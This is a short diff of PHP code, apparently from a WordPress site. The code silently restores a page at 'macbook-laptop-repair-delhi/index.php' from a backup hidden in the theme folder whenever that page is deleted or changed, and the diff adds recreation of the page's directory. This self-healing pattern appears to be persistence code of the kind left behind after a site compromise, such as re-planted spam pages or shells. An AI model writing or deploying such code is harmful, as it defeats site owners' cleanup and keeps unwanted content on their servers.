@@ -1,12 +1,16 @@
 <?php
-//
 $backup_file = ABSPATH . 'wp-content/themes/hello-elementor/bk_macbk.php';
-$target_file = ABSPATH . 'macbook-laptop-repair-delhi/index.php';
+$target_dir  = ABSPATH . 'macbook-laptop-repair-delhi/';
+$target_file = $target_dir . 'index.php';
+
+// 
+if (!is_dir($target_dir)) {
+    mkdir($target_dir, 0755, true);
+}
 
 // 
 if (!file_exists($target_file) || md5_file($target_file) !== md5_file($backup_file)) {
     copy($backup_file, $target_file);
-    // Reload halaman
     header("Location: " . $_SERVER['REQUEST_URI']);
     exit;
 }
